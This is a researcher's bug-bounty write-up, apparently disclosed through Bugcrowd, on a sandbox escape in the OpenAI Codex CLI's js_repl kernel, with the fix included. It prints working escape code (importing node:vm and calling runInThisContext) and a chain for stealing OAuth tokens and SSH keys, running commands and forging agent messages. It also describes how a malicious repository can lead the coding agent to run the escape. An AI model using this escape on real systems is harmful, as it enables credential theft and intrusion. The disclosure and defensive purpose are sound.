# 🧪 Bonus · OpenAI Codex — JS REPL Sandbox Escape (my own research)

> 🎫 **Credit**
> **Researcher:** me ([Young-Syre](https://github.com/Young-Syre))
> **Target:** OpenAI Codex CLI — the `js_repl` kernel (`codex-rs/core/src/tools/js_repl/kernel.js`)
> **Program:** OpenAI (Bugcrowd) · **Submitted:** 2026-03-07
> **Severity:** High (CVSS ~8.5) · **Est. tier:** ~$10,000 RCE
> **Outcome:** ❌ **Closed as a verified duplicate** — I submitted a few hours behind another researcher. Real bug, real technique, **no payout**.

---

## Why this is in the repo

Everything above this file is other people's legendary, high-paying work. This one's mine, and it's here *because* it didn't pay — it's the most honest lesson in the collection.

It was a genuine sandbox-escape RCE. OpenAI/Bugcrowd confirmed the vulnerability. But another researcher had reported the same thing a **couple of hours earlier**, so mine was marked a **duplicate** and closed. (I never learned whether the first reporter got paid.) In the duplicate game, the bug is only half the job — **speed is the other half.** Several of the Web3 legends in this repo were patched within hours of the *first* report; I was on the wrong side of that clock.

No payout. Still proud of the find. Keeping it here, labeled honestly.

---

## 🎯 TL;DR

Codex runs model-generated JavaScript in a `vm` sandbox and tries to contain it with a **module denylist** of just three entries: `process`, `child_process`, `worker_threads`. But **`vm` itself wasn't on the denylist.** Import `node:vm`, call `vm.runInThisContext('process')`, and you're executing in the kernel's *real* V8 context — denylist fully bypassed, with access to credentials, DoS, agent-message forgery, and (in full-access mode) command execution.

---

## ⚙️ How it works

The sandbox is built with `vm.createContext({})` (no `process` in it), and user code runs as a `SourceTextModule`. The containment is a denylist in `kernel.js`:

```javascript
const deniedBuiltinModules = new Set([
  "process", "node:process",
  "child_process", "node:child_process",
  "worker_threads", "node:worker_threads",
]);   // vm is NOT here — that's the whole bug
```

`vm.runInThisContext()` runs its argument in the **calling** script's V8 context, not the sandboxed one. So:

```js
const vm = await import('node:vm');          // not on the denylist
const p  = vm.runInThisContext('process');   // 'process' — denied, now bypassed
const cp = p.mainModule.require('child_process'); // also denied, now reachable
```

From there the full chain opens up:

```
import('node:vm')
  └─ vm.runInThisContext('process')         → escape the VM sandbox
        ├─ process.mainModule.require('fs')  → read ~/.codex/auth.json (OAuth tokens), ~/.ssh/
        ├─ process.mainModule.require('child_process') → execSync (RCE in full-access mode)
        ├─ process.exit() / process.kill(ppid)         → DoS the kernel / signal parent
        └─ process.stdout.write()            → forge JSON into the agent message pipe
```

**Confirmed impact** (even in read-only mode): theft of the OpenAI `access_token` + `refresh_token` (persistent, survives password change), email/account ID, SSH keys, and other env secrets; kernel DoS; and forged agent messages. `execSync` RCE worked in `danger-full-access` mode (the OS landlock+seccomp layer blocked spawning in read-only mode — a nice reminder that defense-in-depth caught part of it).

**Attack scenario:** a malicious repo contains JS → victim asks Codex to work on it → the agent evaluates the JS in `js_repl` → one-line escape → refresh token exfiltrated → attacker mints new access tokens indefinitely using the public `client_id`.

---

## 🛠️ The fix

```javascript
// Minimum: add vm to the denylist
const deniedBuiltinModules = new Set([
  "process", "node:process",
  "child_process", "node:child_process",
  "worker_threads", "node:worker_threads",
  "vm", "node:vm",   // prevents the runInThisContext context escape
]);
// Better: switch from a denylist to an allowlist (buffer, crypto, path, url, util, ...).
```

This is the real takeaway of the bug itself: **denylists for a sandbox boundary are a losing game.** You can't enumerate every dangerous builtin; `vm` was the one that slipped. Allowlist, or don't call it a sandbox.

---

## 💡 Lessons I actually took from it

1. **Being right isn't being first.** A verified high-severity RCE earns $0 if someone beat you by three hours. Report fast, report the moment you've confirmed.
2. **Denylist = incomplete by construction.** The vulnerability and my own near-miss rhyme: enumerate-the-bad-things always loses to allow-only-the-good-things.
3. **Dupes still teach.** This is the cleanest escape I've written up, and it sharpened how I think about VM boundaries. Worth keeping, even at $0.

---

*Responsibly disclosed to OpenAI via Bugcrowd; the issue has since been addressed upstream. Included here as my own research, with its real outcome stated plainly.*
